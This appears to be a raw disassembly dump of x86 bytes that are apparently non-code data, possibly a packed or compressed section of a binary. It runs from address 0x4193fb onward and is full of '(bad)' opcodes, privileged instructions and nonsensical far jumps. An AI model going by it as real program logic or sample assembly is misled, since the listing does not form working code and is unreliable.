  4193fb:	mov    ds:0x26ae516f,eax
  419400:	ins    BYTE PTR es:[edi],dx
  419401:	lds    di,DWORD PTR [edi+0x2229be46]
  419408:	(bad)  
  419409:	sbb    ecx,DWORD PTR [eax+0x2bbb5fce]
  41940f:	imul   eax,DWORD PTR [ebx+0x79],0x89655509
  419416:	and    al,0xa5
  419418:	push   0xffffffc2
  41941a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41941b:	ss fucomi st,st(5)
  41941e:	cmp    BYTE PTR [edx+0x59],cl
  419421:	pop    ebx
  419422:	mov    esp,0x1b6a222b
  419427:	xor    al,0x61
  419429:	dec    esp
  41942a:	lahf   
  41942b:	xor    dh,BYTE PTR [edx+0x28]
  41942e:	(bad)  
  41942f:	loope  0x4194a9
  419431:	mov    ss,WORD PTR [ebx]
  419433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419434:	imul   esi,DWORD PTR [eax+0x34],0x46
  419438:	cmp    eax,0x70c259dd
  41943d:	dec    esi
  41943e:	clc    
  41943f:	in     eax,0x91
  419441:	and    ebx,DWORD PTR [ecx-0x4d826ddc]
  419447:	mov    ch,0x60
  419449:	sub    DWORD PTR [eax-0x13],esi
  41944c:	pop    ss
  41944d:	fdiv   DWORD PTR [edi+0x20]
  419450:	ja     0x419400
  419452:	mov    ebx,0xc94ad400
  419457:	dec    ecx
  419458:	xor    ebx,edx
  41945a:	fild   QWORD PTR [edx]
  41945c:	imul   ebp,edi,0x71b5a751
  419462:	js     0x4194a0
  419464:	int    0x15
  419466:	push   edi
  419467:	dec    ebx
  419468:	into   
  419469:	dec    eax
  41946a:	dec    esp
  41946b:	fcmovnu st,st(6)
  41946d:	dec    esi
  41946e:	mov    dl,0x37
  419470:	mov    WORD PTR [ecx+eiz*4-0x3d],fs
  419474:	inc    ebp
  419475:	sub    eax,0xc6a47e2
  41947a:	xor    DWORD PTR [eax-0x3d8593c6],0xfbd60960
  419484:	test   BYTE PTR [edi+0x63],al
  419487:	rol    ecx,0x64
  41948a:	mov    bl,BYTE PTR ds:0x6d906c53
  419490:	sahf   
  419491:	mov    dl,0x21
  419493:	mov    edi,0x85d09d67
  419498:	sbb    BYTE PTR [ecx],al
  41949a:	push   ecx
  41949b:	jle    0x4194d1
  41949d:	cmc    
  41949e:	pop    es
  41949f:	jmp    0x4194b1
  4194a1:	arpl   sp,cx
  4194a3:	mov    ebp,0xe98f2b1d
  4194a8:	pop    ds
  4194a9:	xchg   edx,eax
  4194aa:	push   ds
  4194ab:	not    DWORD PTR [ebx+ebp*4+0x2d]
  4194af:	stos   DWORD PTR es:[edi],eax
  4194b0:	neg    BYTE PTR [ebx+0x9]
  4194b3:	clc    
  4194b4:	inc    esi
  4194b5:	aad    0x1f
  4194b7:	call   0xb0ecc605
  4194bc:	and    bl,BYTE PTR [ecx-0x34]
  4194bf:	test   DWORD PTR [ebp-0x3c],esp
  4194c2:	mov    al,0x1c
  4194c4:	pop    edi
  4194c5:	test   eax,0xf61ee078
  4194ca:	ja     0x4194df
  4194cc:	xor    DWORD PTR fs:[eax+0x54da3f37],edx
  4194d3:	repz xor al,0x4a
  4194d6:	enter  0x97ce,0xce
  4194da:	lock push ebx
  4194dc:	pop    ebx
  4194dd:	xchg   esp,eax
  4194de:	(bad)  
  4194df:	jl     0x419494
  4194e1:	cmp    eax,0xd2ccbb57
  4194e6:	(bad)  
  4194e7:	rcl    ecx,1
  4194e9:	scas   eax,DWORD PTR es:[edi]
  4194ea:	sub    esi,DWORD PTR [ecx+ecx*1]
  4194ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194ee:	or     BYTE PTR [esi-0x1b],bl
  4194f1:	cmp    BYTE PTR [edx],dl
  4194f3:	sbb    esp,esi
  4194f5:	add    eax,0x316708c2
  4194fa:	push   ecx
  4194fb:	jne    0x4194e4
  4194fd:	call   0xf634:0xf6b5b282
  419504:	or     BYTE PTR [edx-0x43],ah
  419507:	pusha  
  419508:	mov    esi,0xac0320f9
  41950d:	inc    edx
  41950e:	pop    eax
  41950f:	rcr    DWORD PTR [ebx],cl
  419511:	ret    
  419512:	and    bh,0xc8
  419515:	sub    ecx,eax
  419517:	popa   
  419518:	inc    esp
  419519:	outs   dx,BYTE PTR ds:[esi]
  41951a:	fld    DWORD PTR [ecx-0x33cad0a8]
  419520:	jmp    0x9211:0x6c50b388
  419527:	loop   0x419584
  419529:	push   ebx
  41952a:	cwde   
  41952b:	enter  0xd69e,0xc9
  41952f:	push   ebx
  419530:	enter  0xb7a2,0x96
  419534:	add    esi,esp
  419536:	mov    esp,0xf6403c87
  41953b:	jb     0x41953a
  41953d:	inc    eax
  41953e:	call   0xe1709e55
  419543:	stos   DWORD PTR es:[edi],eax
  419544:	lods   al,BYTE PTR ds:[esi]
  419545:	fs enter 0xc960,0xeb
  41954a:	in     al,0xb0
  41954c:	mov    ?,WORD PTR [eax+0x43262f6d]
  419552:	(bad)  
  419553:	out    0x55,al
  419555:	or     DWORD PTR [eax+0x69b82129],0x4c
  41955c:	stc    
  41955d:	(bad)  
  41955e:	xlat   BYTE PTR ds:[ebx]
  41955f:	nop
  419560:	pop    ecx
  419561:	cmp    dh,0xfc
  419564:	retf   
  419565:	mov    eax,ds:0x183c5d92
  41956a:	push   edi
  41956b:	dec    edx
  41956c:	(bad)  
  41956d:	repz xlat BYTE PTR ds:[ebx]
  41956f:	lahf   
  419570:	mov    edi,0x53375023
  419575:	mov    ebx,0xefc2ca48
  41957a:	mov    edx,0x12a77de7
  41957f:	imul   ebx,DWORD PTR [ebp-0x4ff2ba4d],0xb9d028ed
  419589:	ret    0xa382
  41958c:	and    al,0x9
  41958e:	call   0xb6fd:0x3595ccf8
  419595:	daa    
  419596:	stos   BYTE PTR es:[edi],al
  419597:	jecxz  0x419539
  419599:	or     eax,0xe2d60c2a
  41959e:	push   ss
  41959f:	cld    
  4195a0:	int    0xba
  4195a2:	xor    BYTE PTR [edx+0x75],0x30
  4195a6:	xor    eax,0xd796b09c
  4195ab:	dec    ebx
  4195ac:	cmc    
  4195ad:	xor    DWORD PTR [edx],ebp
  4195af:	jne    0x4195d5
  4195b1:	imul   eax,DWORD PTR [ebx],0x22
  4195b4:	push   ds
  4195b5:	(bad)  
  4195b6:	ins    DWORD PTR es:[edi],dx
  4195b7:	mov    esp,0xff46d463
  4195bc:	mov    ds:0xde38288c,eax
  4195c1:	push   ds
  4195c2:	lods   al,BYTE PTR ds:[esi]
  4195c3:	or     ebx,DWORD PTR [eax]
  4195c5:	shr    BYTE PTR [ebx-0x1ac2187a],1
  4195cb:	pushf  
  4195cc:	dec    ebp
  4195cd:	xchg   esp,eax
  4195ce:	ins    DWORD PTR es:[edi],dx
  4195cf:	xchg   ebp,eax
  4195d0:	jnp    0x4195f9
  4195d2:	jp     0x4195bc
  4195d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195d5:	aas    
  4195d6:	mov    ecx,0x5e60415a
  4195db:	retf   0x68cc
  4195de:	(bad)  
  4195df:	fadd   QWORD PTR [edx-0x74]
  4195e2:	fstp   TBYTE PTR [ebp+0x76]
  4195e5:	mov    WORD PTR [ecx],?
  4195e7:	in     eax,0xf7
  4195e9:	cmp    eax,0xc645a7b9
  4195ee:	mov    bh,BYTE PTR [ebx]
  4195f0:	out    dx,al
  4195f1:	out    dx,al
  4195f2:	fwait
  4195f3:	das    
  4195f4:	mov    ebx,0xbd440372
  4195f9:	sbb    bh,BYTE PTR [eax-0x63]
  4195fc:	and    DWORD PTR [ecx],ebx
  4195fe:	ins    DWORD PTR es:[edi],dx
  4195ff:	not    BYTE PTR [ecx]
  419601:	mov    ebx,0x33b505c9
  419606:	mov    bh,0xd3
  419608:	mov    ecx,0xf2aa6f2f
  41960d:	xor    BYTE PTR [esi-0x2fc6b96f],bh
  419613:	jmp    0xb605acc1
  419618:	imul   esi,DWORD PTR [edi-0x33c0df30],0xffffffd4
  41961f:	sbb    edx,DWORD PTR fs:[ebp+0x156cdb77]
  419626:	inc    ebx
  419627:	dec    eax
  419628:	cli    
  419629:	ins    BYTE PTR es:[edi],dx
  41962a:	cmp    al,0x50
  41962c:	push   edx
  41962d:	arpl   di,bx
  41962f:	pand   mm7,QWORD PTR [ecx+0x4a00a721]
  419636:	push   es
  419637:	push   esi
  419639:	push   ebx
  41963a:	aaa    
  41963b:	mov    dl,0x90
  41963d:	inc    ebp
  41963e:	in     al,dx
  41963f:	in     al,0xf7
  419641:	inc    ecx
  419642:	mov    eax,ecx
  419644:	nop
  419645:	into   
  419646:	nop
  419647:	add    ebx,DWORD PTR [edi]
  419649:	aaa    
  41964a:	enter  0x1743,0x16
  41964e:	mov    ecx,ebp
  419650:	lods   eax,DWORD PTR ds:[esi]
  419651:	test   cl,dh
  419653:	test   al,0x32
  419655:	add    al,0x34
  419657:	pop    ss
  419658:	pop    ebx
  419659:	das    
  41965a:	inc    ebp
  41965b:	xor    DWORD PTR [ebx+ecx*4],esi
  41965e:	addr16 xor esi,ecx
  419661:	fs sbb al,0x50
  419664:	inc    esi
  419665:	(bad)  
  419666:	stos   DWORD PTR es:[edi],eax
  419667:	sub    esp,DWORD PTR [edi-0x72]
  41966a:	or     al,0xa
  41966c:	add    al,0x18
  41966e:	push   ss
  41966f:	dec    esi
  419670:	dec    eax
  419671:	dec    edx
  419672:	imul   eax,DWORD PTR [esi-0x7153eeb3],0x5d
  419679:	(bad)  
  41967b:	cwde   
  41967c:	sub    edi,DWORD PTR [ecx+0x7a22e3f8]
  419682:	jmp    0x41961b
  419684:	or     edi,DWORD PTR [edi]
  419686:	xchg   edx,eax
  419687:	xchg   edx,eax
  419688:	sar    BYTE PTR [edi],1
  41968a:	xchg   ebp,ecx
  41968c:	xchg   esi,eax
  41968d:	je     0x419699
  41968f:	jecxz  0x419680
  419691:	adc    dl,bh
  419693:	sysret 
  419695:	lods   eax,DWORD PTR ds:[esi]
  419696:	iret   
  419697:	mov    ch,0xcc
  419699:	js     0x419670
  41969b:	adc    eax,0x6023cb86
  4196a0:	jno    0x419702
  4196a2:	clc    
  4196a3:	and    DWORD PTR [esi],esp
  4196a5:	hlt    
  4196a6:	xor    al,0x69
  4196a8:	pop    edi
  4196a9:	adc    BYTE PTR [eax-0x32],ah
  4196ac:	clc    
  4196ad:	add    al,BYTE PTR [esi-0x78]
  4196b0:	mov    al,0x2
  4196b2:	gs (bad) 
  4196b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b5:	mov    ecx,0xf62476c7
  4196ba:	stos   DWORD PTR es:[edi],eax
  4196bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196bc:	dec    edi
  4196bd:	sbb    bl,ch
  4196bf:	jl     0x419717
  4196c1:	and    ebx,esi
  4196c3:	outs   dx,BYTE PTR ds:[esi]
  4196c4:	das    
  4196c5:	pushf  
  4196c6:	mov    bl,0xd3
  4196c8:	scas   al,BYTE PTR es:[edi]
  4196c9:	jne    0x4196c4
  4196cb:	jo     0x419662
  4196cd:	mov    esp,0x3e5fd1f9
  4196d2:	xor    DWORD PTR ds:0x69a1043e,0x1697f0bd
  4196dc:	pop    esi
  4196dd:	sub    dl,bh
  4196df:	adc    ecx,DWORD PTR [bp-0x26]
  4196e3:	xlat   BYTE PTR ds:[ebx]
  4196e4:	(bad)  
  4196e5:	pop    esi
  4196e6:	in     al,dx
  4196e7:	imul   BYTE PTR [eax+esi*8-0x1f]
  4196eb:	lea    eax,[esi]
  4196ed:	mov    cl,0x90
  4196ef:	adc    eax,0x8409c269
  4196f4:	out    0x7f,al
  4196f6:	inc    esi
  4196f7:	scas   al,BYTE PTR es:[edi]
  4196f8:	pop    esp
  4196f9:	cli    
  4196fa:	rcr    DWORD PTR [esi],cl
  4196fc:	jnp    0x41970d
  4196fe:	aaa    
  4196ff:	mov    dl,0xba
  419701:	cmp    DWORD PTR [esi],esp
  419703:	stc    
  419704:	repz mov ebp,0xc270f1e3
  41970a:	sub    al,0x77
  41970c:	xchg   ebx,eax
  41970d:	sub    DWORD PTR [eax],edx
  41970f:	and    ch,BYTE PTR [eax+0x0]
  419712:	jae    0x4196b6
  419714:	aam    0x4
  419716:	ds rcl edi,0x19
  41971a:	xor    BYTE PTR [eax],cl
  41971c:	adc    ecx,esp
  41971e:	mov    edi,0xf56e0c7a
  419723:	stos   BYTE PTR es:[edi],al
  419724:	mov    edx,0xe64763fa
  419729:	xor    al,0x6e
  41972b:	push   ebp
  41972c:	push   ecx
  41972d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41972e:	pop    ds
  41972f:	pusha  
  419730:	pop    ebp
  419731:	xchg   DWORD PTR [eax-0x63],ecx
  419734:	pop    esi
  419735:	les    edx,FWORD PTR ds:0xa9e1f447
  41973b:	hlt    
  41973c:	je     0x419772
  41973e:	in     eax,0x3b
  419740:	in     eax,0xc6
  419742:	dec    ecx
  419743:	cs pop ss
  419745:	stc    
  419746:	mov    ds:0x2cede714,eax
  41974b:	mov    dl,0xe1
  41974d:	jp     0x41970c
  41974f:	mov    edx,0xa2d3f39f
  419754:	mov    bh,0x41
  419756:	xchg   bh,bl
  419758:	cmc    
  419759:	jge    0x4196e1
  41975b:	ins    BYTE PTR es:[edi],dx
  41975c:	push   esi
  41975d:	cli    
  41975e:	stos   DWORD PTR es:[edi],eax
  41975f:	test   bl,bh
  419761:	out    dx,eax
  419762:	mov    bh,0x0
  419764:	cdq    
  419765:	inc    esp
  419766:	sub    eax,DWORD PTR [ebp-0x42]
  419769:	(bad)  
  41976a:	cmp    ebp,esi
  41976c:	bound  ebp,QWORD PTR [ebx+0x37]
  41976f:	dec    esp
  419770:	cmp    al,0x7c
  419772:	mov    al,ds:0x35bb7173
  419777:	add    eax,0xcb59b517
  41977c:	loop   0x41973d
  41977e:	cmp    al,0xf0
  419780:	(bad)  
  419781:	sbb    DWORD PTR [eax-0x6c],ecx
  419784:	inc    ebx
  419785:	lods   eax,DWORD PTR ds:[esi]
  419786:	dec    DWORD PTR [eax+0x7b9d5105]
  41978c:	std    
  41978d:	mov    eax,0x921ab2b1
  419792:	ss push ebx
  419794:	test   DWORD PTR [esi+eiz*8+0x19],eax
  419798:	jmp    0x7ab:0x518d1d1a
  41979f:	xor    eax,0xd2550ac2
  4197a4:	sar    BYTE PTR [esi-0x10],cl
  4197a7:	mov    ds:0xf1aee7b2,al
  4197ac:	add    bl,dl
  4197ae:	(bad)  
  4197af:	dec    eax
  4197b0:	in     eax,0xbb
  4197b2:	add    eax,0xb4a7b8eb
  4197b7:	lods   eax,DWORD PTR ds:[esi]
  4197b8:	xchg   esp,eax
  4197b9:	addr16 jno 0x419826
  4197bc:	shl    BYTE PTR [ecx],0xb2
  4197bf:	xor    ch,BYTE PTR [edi]
  4197c1:	jo     0x419788
  4197c3:	push   esp
  4197c4:	mov    ds:0x68ae594,al
  4197c9:	inc    eax
  4197ca:	cmp    ax,0x5f25
  4197ce:	or     eax,0xe45d6ab1
  4197d3:	gs push cs
  4197d5:	push   ebp
  4197d6:	pop    ebp
  4197d7:	push   esi
  4197d8:	jl     0x4197ba
  4197da:	int    0xd3
  4197dc:	push   esp
  4197dd:	mov    dl,0xb1
  4197df:	inc    ebp
  4197e0:	or     edx,ebp
  4197e2:	std    
  4197e3:	stc    
  4197e4:	mov    edx,0xe823dcdf
  4197e9:	xor    eax,0x9059d71e
  4197ee:	pop    ecx
  4197ef:	int    0x38
  4197f1:	sbb    DWORD PTR [edx+0x1d6c83fb],0x5fa67434
  4197fb:	mov    bl,0xf8
  4197fd:	xor    al,0xf3
  4197ff:	push   esp
  419800:	and    eax,0xbba91359
  419805:	sbb    esp,DWORD PTR [edx+0xe0f44e]
  41980b:	test   dl,ah
  41980d:	scas   eax,DWORD PTR es:[edi]
  41980e:	and    DWORD PTR [edx],ebp
  419810:	test   eax,0xe0a95b81
  419815:	mov    DWORD PTR [esi-0xe],ebp
  419818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419819:	mov    ebp,0x19af230a
  41981e:	xchg   ebp,eax
  41981f:	punpcklwd mm0,DWORD PTR [ecx-0x26]
  419823:	push   0xf358e7a9
  419828:	jno    0x41983d
  41982a:	lea    ecx,[ecx-0x6b]
  41982d:	xchg   DWORD PTR [ebp+0x65],esi
  419830:	mov    edi,0x5db0b0a7
  419835:	lods   eax,DWORD PTR ds:[esi]
  419836:	mov    ?,WORD PTR [edi-0x36771154]
  41983c:	enter  0x17a0,0xe9
  419840:	jp     0x419845
  419842:	or     DWORD PTR [eax-0x38],ecx
  419845:	popa   
  419846:	or     BYTE PTR [ecx+0x59],0xb6
  41984a:	nop
  41984b:	push   ecx
  41984c:	inc    ebp
  41984d:	test   eax,0x71846399
  419852:	fmul   QWORD PTR [eax+0x39636067]
  419858:	bound  eax,QWORD PTR [eax-0x41]
  41985b:	xor    DWORD PTR [edx],ecx
  41985d:	leave  
  41985e:	(bad)  
  41985f:	adc    bh,BYTE PTR [ebp+0x1e852d1c]
  419865:	loop   0x41980e
  419867:	jno    0x419867
  419869:	push   esp
  41986a:	fcomp  st(0)
  41986c:	call   0xe6d70738
  419871:	cs xchg edx,eax
  419873:	rcr    BYTE PTR [edi],cl
  419875:	out    dx,eax
  419876:	lods   al,BYTE PTR ds:[esi]
  419877:	cmp    al,0x7
  419879:	or     edx,ecx
  41987b:	adc    esi,DWORD PTR [eax-0x24]
  41987e:	mov    edi,0xd1601ca1
  419883:	push   edi
  419884:	mov    cl,0x83
  419886:	test   al,0x12
  419888:	mov    ah,0xe7
  41988a:	cmp    bh,BYTE PTR [esi]
  41988c:	retf   0x45c6
  41988f:	sbb    dh,BYTE PTR [ecx]
  419891:	icebp  
  419892:	and    ah,dl
  419894:	cwde   
  419895:	call   0x2f041eeb
  41989a:	(bad)  
  41989b:	outs   dx,DWORD PTR ds:[esi]
  41989c:	adc    DWORD PTR [edx+0x7c21736f],0xffffffed
  4198a3:	or     ah,dl
  4198a5:	xor    DWORD PTR [ecx],ebx
  4198a7:	and    edx,DWORD PTR [eax+0x2b]
  4198aa:	mov    ah,0x75
  4198ac:	jns    0x4198e7
  4198ae:	sbb    ecx,DWORD PTR [ebx+ebp*4+0x7d]
  4198b2:	pop    ecx
  4198b3:	call   0x49fd:0xa527dfb4
  4198ba:	scas   al,BYTE PTR es:[edi]
  4198bb:	inc    ebp
  4198bc:	cmp    bh,al
  4198be:	push   ss
  4198bf:	and    edx,ebx
  4198c1:	mov    dl,0x14
  4198c3:	mov    bl,0xaf
  4198c5:	scas   eax,DWORD PTR es:[edi]
  4198c6:	aaa    
  4198c7:	aaa    
  4198c8:	sub    eax,0x8e7befd6
  4198cd:	or     bl,BYTE PTR [edx+0x695a915d]
  4198d3:	xchg   ebp,eax
  4198d4:	xor    al,0xf0
  4198d6:	push   ebx
  4198d7:	mov    esi,0x53093f7
  4198dc:	sti    
  4198dd:	inc    esi
  4198de:	icebp  
  4198df:	push   esp
  4198e0:	pop    edx
  4198e1:	shl    BYTE PTR [eax+ebx*8+0x34],1
  4198e5:	fs in  al,0x68
  4198e8:	cld    
  4198e9:	xor    edi,DWORD PTR [esi+edi*2+0x387a6964]
  4198f0:	inc    esp
  4198f1:	cmp    BYTE PTR [esi],dl
  4198f3:	pushf  
  4198f4:	test   al,0xd9
  4198f6:	jne    0x419885
  4198f8:	xchg   edx,eax
  4198f9:	jecxz  0x4198fc
  4198fb:	or     al,0x2
  4198fd:	icebp  
  4198fe:	cdq    
  4198ff:	jae    0x4198c6
  419901:	aam    0x54
  419903:	ror    DWORD PTR [eax-0x1d],cl
  419906:	daa    
  419907:	and    esp,eax
  419909:	xchg   ebx,eax
  41990a:	or     ch,BYTE PTR [edx-0x6f]
  41990d:	je     0x41996c
  41990f:	adc    DWORD PTR [edi-0x4],edi
  419912:	sub    esp,DWORD PTR [ecx+edx*8+0x19]
  419916:	xor    dh,bh
  419918:	lahf   
  419919:	retf   0x1712
  41991c:	fisttp QWORD PTR [eax+eiz*1-0x53]
  419920:	and    ebp,esp
  419922:	out    dx,eax
  419923:	mov    al,0x5b
  419925:	push   edx
  419926:	cdq    
  419927:	cmp    BYTE PTR [edi+0x25],bh
  41992a:	mov    esp,0xea017194
  41992f:	ffree  st(2)
  419931:	mov    al,0x37
  419933:	loop   0x419924
  419935:	xchg   ecx,eax
  419936:	pop    ebp
  419937:	mov    esi,0x948fd391
  41993c:	lods   al,BYTE PTR ds:[esi]
  41993d:	xchg   BYTE PTR [ecx+0x5d],dh
  419940:	xchg   edx,eax
  419941:	loope  0x4199b9
  419943:	ret    
  419944:	cmc    
  419945:	sbb    al,bl
  419947:	xchg   esi,eax
  419948:	fisubr DWORD PTR [edi-0x5fb7784]
  41994e:	pusha  
  41994f:	mov    al,ds:0x6b84778e
  419954:	lock inc esp
  419956:	adc    BYTE PTR [esp+edi*2-0x50],0xec
  41995b:	(bad)  
  41995d:	cs ss push ebp
  419960:	sbb    ebp,esp
  419962:	(bad)  
  419963:	mov    cl,0x6b
  419965:	sbb    eax,0xdc2c8f13
  41996a:	adc    ch,BYTE PTR [ecx+esi*8]
  41996d:	lods   al,BYTE PTR ds:[esi]
  41996e:	paddq  mm0,QWORD PTR [eax]
  419971:	xor    eax,0xed79aa75
  419976:	cmp    BYTE PTR [esi+eax*8],dh
  419979:	jp     0x4199c3
  41997b:	test   eax,0xa42cf5b3
  419980:	inc    esp
  419981:	jmp    0xf6ac1ba4
  419986:	dec    eax
  419987:	inc    ebx
  419988:	dec    eax
  419989:	aaa    
  41998a:	xor    BYTE PTR [ebx-0x25],0x51
  41998e:	inc    ebp
  41998f:	mov    ch,0xbc
  419991:	fst    DWORD PTR [eax-0x6ec66a28]
  419997:	push   eax
  419998:	xor    eax,DWORD PTR [ecx]
  41999a:	add    BYTE PTR [edi+0x3d679fac],al
  4199a0:	cmp    cl,BYTE PTR [ebx-0x46571a56]
  4199a6:	int3   
  4199a7:	(bad)  
  4199a8:	dec    ebp
  4199a9:	push   ebp
  4199aa:	addr16 nop
  4199ac:	adc    ch,al
  4199ae:	stos   DWORD PTR es:[edi],eax
  4199af:	push   edx
  4199b0:	xchg   BYTE PTR [eax+0x7711b1c9],bh
  4199b6:	jne    0x4199f9
  4199b8:	jp     0x41995b
  4199ba:	cmp    al,0xbd
  4199bc:	push   esi
  4199bd:	shl    DWORD PTR [ebp-0x1f],1
  4199c0:	push   ss
  4199c1:	adc    al,0xbf
  4199c3:	xor    eax,DWORD PTR [edi+0x21]
  4199c6:	icebp  
  4199c7:	sti    
  4199c8:	int3   
  4199c9:	jo     0x4199e7
  4199cb:	dec    BYTE PTR [ebp-0x3f]
  4199ce:	push   ds
  4199cf:	sub    edx,DWORD PTR [edx]
  4199d1:	rcr    DWORD PTR [eax-0x7b8b0fdf],0x4d
  4199d8:	mov    ebx,0x163a78d2
  4199dd:	fild   QWORD PTR [esi]
  4199df:	push   ecx
  4199e0:	mov    BYTE PTR [ecx],dl
  4199e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199e3:	stos   BYTE PTR es:[edi],al
  4199e4:	push   cs
  4199e5:	(bad)  
  4199e6:	mov    eax,0xea70c508
  4199eb:	(bad)  
  4199ec:	mov    ah,0x2b
  4199ee:	or     DWORD PTR [ecx-0x737963ac],ebx
  4199f4:	lahf   
  4199f5:	packssdw mm4,QWORD PTR [eax]
  4199f8:	out    dx,al
  4199f9:	loop   0x4199d2
  4199fb:	das    
  4199fc:	rcr    BYTE PTR [esi+esi*2-0x71],cl
  419a00:	mov    dl,0x5e
  419a02:	addr16 add eax,0xf6b82208
  419a08:	ins    BYTE PTR es:[edi],dx
  419a09:	add    eax,0xdb0cfa39
  419a0e:	push   ecx
  419a0f:	shl    BYTE PTR [ebp-0x7eed8c9a],0x99
  419a16:	jge    0x419a6e
  419a18:	or     DWORD PTR [edx-0x3],ebx
  419a1b:	rol    BYTE PTR [ecx+edi*2],cl
  419a1e:	fimul  WORD PTR [ecx]
  419a20:	or     bl,BYTE PTR [edi]
  419a22:	and    eax,0x735eb29
  419a27:	rcl    DWORD PTR ds:0xb0ee0532,1
  419a2d:	xor    DWORD PTR [edx],esp
  419a2f:	lods   eax,DWORD PTR ds:[esi]
  419a30:	and    BYTE PTR es:[esi+eax*2+0x680659d0],bh
  419a38:	pop    ss
  419a39:	push   ss
  419a3a:	in     al,0xe6
  419a3c:	daa    
  419a3d:	mov    eax,ds:0xd7621e2d
  419a42:	lods   eax,DWORD PTR gs:[esi]
  419a44:	or     edx,DWORD PTR [ebp-0x17]
  419a47:	cwde   
  419a48:	clc    
  419a49:	mov    bl,0xf0
  419a4b:	(bad)  
  419a4c:	icebp  
  419a4d:	cmp    ah,BYTE PTR [edx+ecx*8]
  419a50:	aas    
  419a51:	scas   eax,DWORD PTR es:[edi]
  419a52:	fs addr16 aam 0x32
  419a56:	xchg   DWORD PTR [eax],ecx
  419a58:	cmc    
  419a59:	sar    DWORD PTR [eax-0x5bf7b6e3],0xf5
  419a60:	mov    eax,ds:0x38395290
  419a65:	retf   0xf885
  419a68:	rcr    ebx,cl
  419a6a:	pop    eax
  419a6b:	in     al,dx
  419a6c:	cmp    ecx,DWORD PTR [edi]
  419a6e:	adc    bh,bh
  419a70:	xchg   ebp,eax
  419a71:	inc    eax
  419a72:	xor    ecx,DWORD PTR [edi+0x5ec4c674]
  419a78:	leave  
  419a79:	popf   
  419a7a:	cld    
  419a7b:	imul   esi
  419a7d:	rcl    BYTE PTR [esi-0x2a],1
  419a80:	mov    ebp,0xfb52a8a7
  419a85:	jp     0x419afd
  419a87:	gs pushf 
  419a89:	je     0x419a97
  419a8b:	aas    
  419a8c:	xchg   ecx,eax
  419a8d:	mov    ds:0xb6328d44,eax
  419a92:	jle    0x419b02
  419a94:	mov    ch,0xa0
  419a96:	or     edx,DWORD PTR [edi]
  419a98:	not    DWORD PTR [ebx-0x1e]
  419a9b:	or     BYTE PTR [eax],dl
  419a9d:	mov    ah,0x3
  419a9f:	rcl    DWORD PTR [esi+0x7997f508],0x5e
  419aa6:	ins    BYTE PTR es:[edi],dx
  419aa7:	mov    eax,0xa66914fb
  419aac:	dec    ebx
  419aad:	imul   DWORD PTR [esi]
  419aaf:	pop    ecx
  419ab0:	mov    edi,es
  419ab2:	mov    ds:0xc58091b,eax
  419ab7:	cwde   
  419ab8:	loopne 0x419b2c
  419aba:	pop    esp
  419abb:	lods   eax,DWORD PTR ds:[esi]
  419abc:	fdivr  DWORD PTR [ecx]
  419abe:	(bad)  
  419abf:	pop    ebx
  419ac0:	ins    BYTE PTR es:[edi],dx
  419ac1:	pop    edi
  419ac2:	mov    esp,DWORD PTR ds:0x94282e09
  419ac8:	cmp    DWORD PTR [esi+0xa],ecx
  419acb:	xchg   BYTE PTR [edx-0x5c1d8de1],al
  419ad1:	in     eax,0x31
  419ad3:	int3   
  419ad4:	mov    ebx,0xc32260d7
  419ad9:	pop    esp
  419ada:	rol    BYTE PTR [ebx+0x7d],cl
  419add:	out    dx,eax
  419ade:	xchg   ebp,eax
  419adf:	ds mov al,0xca
  419ae2:	ins    BYTE PTR es:[edi],dx
  419ae3:	xchg   edi,eax
  419ae4:	mov    esi,?
  419ae6:	cdq    
  419ae7:	jl     0x419b0b
  419ae9:	pop    ebx
  419aea:	bnd jne 0x419a8d
  419aed:	push   es
  419aee:	or     ah,BYTE PTR [ebp+0x7c]
  419af1:	jbe    0x419ad2
  419af3:	xchg   BYTE PTR [eax+0x5912136c],bl
  419af9:	out    dx,eax
  419afa:	cmp    ah,cl
  419afc:	adc    DWORD PTR [ebx-0x31],edi
  419aff:	fsub   DWORD PTR [ebx+0x5fa52df0]
  419b05:	ins    DWORD PTR es:[edi],dx
  419b06:	or     al,0xb7
  419b08:	mov    edi,0x8acda7c0
  419b0d:	push   eax
  419b0e:	(bad)  
  419b0f:	addr16 ret 0x9838
  419b13:	xchg   esi,eax
  419b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b15:	dec    esp
  419b16:	jne    0x419ac8
  419b18:	xchg   DWORD PTR [ebx+0x7b],esi
  419b1b:	inc    ebx
  419b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b1d:	repz in eax,dx
  419b1f:	dec    ebx
  419b20:	scas   eax,DWORD PTR es:[edi]
  419b21:	inc    esi
  419b22:	enter  0xdd96,0xcb
  419b26:	outs   dx,BYTE PTR ds:[esi]
  419b27:	je     0x419b47
  419b29:	mov    al,ds:0x528d26c2
  419b2e:	iret   
  419b2f:	cwde   
  419b30:	add    esp,eax
  419b32:	sub    ecx,esp
  419b34:	cmp    al,0xfd
  419b36:	scas   al,BYTE PTR es:[di]
  419b38:	inc    ecx
  419b39:	out    dx,al
  419b3a:	jb     0x419b30
  419b3c:	mov    eax,DWORD PTR [ebp+0x28e0929f]
  419b42:	push   ebp
  419b43:	call   0x634:0x2aaa241b
  419b4a:	add    ah,bh
  419b4c:	add    DWORD PTR [eax+0x3d6b0d95],0x15
  419b53:	jbe    0x419b98
  419b55:	cmc    
  419b56:	sti    
  419b57:	stc    
  419b58:	inc    ecx
  419b59:	and    eax,0x3d27f249
  419b5e:	es dec eax
  419b60:	lods   eax,DWORD PTR ds:[esi]
  419b61:	jb     0x419b6b
  419b63:	jnp    0x419b23
  419b65:	cmp    eax,0xf5883d52
  419b6a:	xor    BYTE PTR [ecx-0x67],cl
  419b6d:	sbb    bh,BYTE PTR [esi]
  419b6f:	mov    bl,0x8e
  419b71:	pop    eax
  419b72:	cs inc eax
  419b74:	shl    al,1
  419b76:	fisttp QWORD PTR [edi+0x21aba7bd]
  419b7c:	add    DWORD PTR [esi-0x50],edi
